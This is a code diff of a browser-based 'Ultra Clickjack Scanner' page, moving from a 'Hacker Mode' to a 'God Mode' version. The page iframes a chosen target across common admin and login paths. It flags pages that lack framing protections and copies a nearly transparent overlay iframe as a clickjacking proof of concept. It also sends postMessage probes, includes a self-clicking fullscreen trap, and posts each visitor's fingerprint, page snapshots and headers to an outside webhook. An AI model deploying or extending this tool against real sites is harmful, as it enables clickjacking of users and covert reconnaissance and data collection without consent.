@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Ultra Clickjack Scanner v3.2 - Hacker Mode</title>
+  <title>Ultra Clickjack Scanner v4.0 - God Mode</title>
   <style>
     body {
       background: #000;
@@ -52,27 +52,21 @@
 </head>
 <body>
   <div id="hud">
-    🛡️ <b>Ultra Clickjack Scanner v3.2</b> - Hacker Mode<br>
-    ✅ Green = VULNERABLE (no XFO/CSP)<br>
-    ⚠️ Orange = FRAMEABLE (CSP or XFO present)<br>
-    ❌ Red = BLOCKED (refused load or CSP frame-ancestors)<br>
-    🕵️ Trap + DOM Snapshot + Header Parser + Cross-Origin Detection
+    🛡️ <b>Ultra Clickjack Scanner v4.0</b> - God Mode<br>
+    ✅ Green = VULNERABLE<br>
+    ⚠️ Orange = FRAMEABLE (But CSP/XFO exists)<br>
+    ❌ Red = BLOCKED (load or denied)<br>
+    🕵️ Trap + DOM Snapshot + postMessage + Headers Active
   </div>
-  <div id="clickTrap"> 🎯 Click Me!</div>
+  <div id="clickTrap">🎯 Click Me!</div>
   <script>
     const webhook = "https://webhook.site/YOUR-UNIQUE-ID"; // Replace with your webhook
 
     const urlParams = new URLSearchParams(window.location.search);
-    let origin = urlParams.get("target");
+    let origin = urlParams.get("target") || prompt("🚨 Enter target URL (e.g., https://example.com):");
+    if (!origin || !/^https?:\/\/.+/i.test(origin)) throw new Error("❌ Invalid target URL");
 
-    if (!origin) {
-      origin = prompt("🚨 Enter target URL (e.g., https://example.com):");
-    }
-
-    if (!origin || !/^https?:\/\/[^ ]+$/i.test(origin)) {
-      alert("❌ Invalid or missing target URL. Please provide a valid ?target= parameter or enter it manually.");
-      throw new Error("Invalid target.");
-    }
+    const endpoints = ["", "/", "/login", "/admin", "/dashboard", "/portal", "/signin", "/secure", "/auth", "/panel", "/settings", "/account", "/user", "/profile", "/index", "/home", "/console", "/clients", "/support", "/cpanel", "/config", "/access", "/myaccount", "/members", "/gateway"];
 
     const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
     const sleep = ms => new Promise(res => setTimeout(res, ms));
@@ -86,21 +80,10 @@
       vendor: navigator.vendor
     });
 
-    const endpoints = [
-      "", "/", "/login", "/admin", "/dashboard", "/portal", "/signin", "/secure", "/auth",
-      "/panel", "/settings", "/myaccount", "/clients", "/support", "/index", "/user", "/home", "/access",
-      "/profile", "/account/settings", "/config", "/console", "/cpanel"
-    ];
-
     const getDOMSnapshot = (doc) => {
       try {
-        return [...doc.querySelectorAll("h1,h2,h3,p,a,button")]
-          .map(e => e.innerText)
-          .filter(Boolean)
-          .slice(0, 5)
-          .join(" | ")
-          .substring(0, 300);
-      } catch {
+        return [...doc.querySelectorAll("h1,h2,h3,p,a,button")].map(e => e.innerText).filter(Boolean).slice(0, 5).join(" | ").substring(0, 300);
+      } catch (e) {
         return "N/A";
       }
     };
@@ -116,9 +99,22 @@
       }
     };
 
-    const copyPayload = (url) => {
-      const iframe = `<iframe src="${url}" width="800" height="600" style="border:0;position:absolute;top:0;left:0;opacity:0.01;z-index:99999" sandbox="allow-scripts allow-same-origin"></iframe>`;
-      navigator.clipboard?.writeText(iframe);
+    const detectPostMessageListener = (win) => {
+      try {
+        const randMsg = "PING-" + Math.random().toString(36).substring(2);
+        const listener = (e) => {
+          if (e.data && typeof e.data === 'string' && e.data.includes(randMsg)) {
+            console.log("postMessage reply:", e.data);
+          }
+        };
+        window.addEventListener("message", listener);
+        win.postMessage(randMsg, "*");
+      } catch (e) {}
+    };
+
+    const copyPoC = (url) => {
+      const code = `<iframe src=\"${url}\" width=800 height=600 style=\"border:0;position:absolute;top:0;left:0;opacity:0.01;z-index:99999\" sandbox=\"allow-scripts allow-same-origin\"></iframe>`;
+      navigator.clipboard?.writeText(code);
     };
 
     const testFrame = async (fullURL) => {
@@ -126,74 +122,47 @@
       const xfo = headers['x-frame-options'] || 'NONE';
       const csp = headers['content-security-policy'] || 'NONE';
 
-      const frame = document.createElement("iframe");
-      frame.src = fullURL;
-      frame.width = rand(800, 1000);
-      frame.height = rand(300, 450);
-      frame.sandbox = "allow-scripts allow-same-origin";
-
       const div = document.createElement("div");
       div.className = "result";
-      document.body.appendChild(frame);
       document.body.appendChild(div);
 
-      frame.onload = async () => {
-        const isSameOrigin = new URL(fullURL).origin === window.location.origin;
-        let snapshot = "Cross-origin DOM access blocked";
+      const iframe = document.createElement("iframe");
+      iframe.src = fullURL;
+      iframe.width = rand(800, 1000);
+      iframe.height = rand(300, 450);
+      iframe.sandbox = "allow-scripts allow-same-origin";
+      document.body.appendChild(iframe);
+
+      iframe.onload = async () => {
+        let snapshot = "Cross-origin (DOM blocked)";
         try {
-          if (isSameOrigin) {
-            const doc = frame.contentDocument || frame.contentWindow.document;
+          if (new URL(fullURL).origin === window.location.origin) {
+            const doc = iframe.contentDocument || iframe.contentWindow.document;
             snapshot = getDOMSnapshot(doc);
           }
-        } catch (e) {
-          snapshot = "DOM access error: " + e;
-        }
+        } catch (e) {}
 
         const vulnerable = (xfo === 'NONE' && csp === 'NONE');
-        const borderColor = vulnerable ? "lime" : "orange";
-        frame.style.border = `5px solid ${borderColor}`;
-        div.style.borderColor = borderColor;
+        const color = vulnerable ? "lime" : "orange";
+        iframe.style.border = `5px solid ${color}`;
+        div.style.borderColor = color;
 
-        div.innerText = `${vulnerable ? '✅ VULNERABLE' : '⚠️ FRAMEABLE with CSP/XFO'} ${fullURL}
-DOM Snapshot: ${snapshot}
-XFO: ${xfo}
-CSP: ${csp}`;
+        div.innerText = `${vulnerable ? '✅ VULNERABLE' : '⚠️ FRAMEABLE with CSP/XFO'} ${fullURL}\nDOM Snapshot: ${snapshot}\nXFO: ${xfo}\nCSP: ${csp}`;
 
-        copyPayload(fullURL);
+        detectPostMessageListener(iframe.contentWindow);
+        copyPoC(fullURL);
+
         await fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            type: vulnerable ? "VULNERABLE" : "FRAMEABLE-WITH-CSP/XFO",
-            url: fullURL,
-            fingerprint: fingerprint(),
-            snapshot,
-            headers
-          })
+          body: JSON.stringify({ type: vulnerable ? "VULNERABLE" : "FRAMEABLE", url: fullURL, fingerprint: fingerprint(), snapshot, headers })
         });
       };
 
-      frame.onerror = async () => {
-        const vulnerable = (xfo === 'NONE' && csp === 'NONE');
-        const borderColor = vulnerable ? "lime" : "red";
-        frame.style.border = `5px solid ${borderColor}`;
-        div.style.borderColor = borderColor;
-
-        div.innerText = `${vulnerable ? '✅ VULNERABLE' : '❌ BLOCKED'} ${fullURL}
-${vulnerable ? 'Loaded but DOM access failed (still framable)' : 'BLOCKED (Load Error or Frame Refused)'}
-XFO: ${xfo}
-CSP: ${csp}`;
-
-        await fetch(webhook, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            type: vulnerable ? "VULNERABLE-BUT-ERROR" : "BLOCKED",
-            url: fullURL,
-            fingerprint: fingerprint(),
-            headers
-          })
-        });
+      iframe.onerror = () => {
+        iframe.style.border = "5px solid red";
+        div.style.borderColor = "red";
+        div.innerText = `❌ ${fullURL}\nBLOCKED (Load error or X-Frame DENY)\nXFO: ${xfo}\nCSP: ${csp}`;
       };
     };
 
@@ -201,17 +170,15 @@ CSP: ${csp}`;
       for (const path of endpoints) {
         const fullURL = origin.replace(/\/$/, "") + path;
         await testFrame(fullURL);
-        await sleep(rand(350, 600));
+        await sleep(rand(300, 700));
       }
     })();
 
     document.getElementById("clickTrap").addEventListener("mouseover", () => {
       setTimeout(() => {
         document.getElementById("clickTrap").click();
-        if (document.documentElement.requestFullscreen) {
-          document.documentElement.requestFullscreen();
-        }
-      }, 1500);
+        document.documentElement.requestFullscreen?.();
+      }, 1000);
     });
   </script>
 </body>
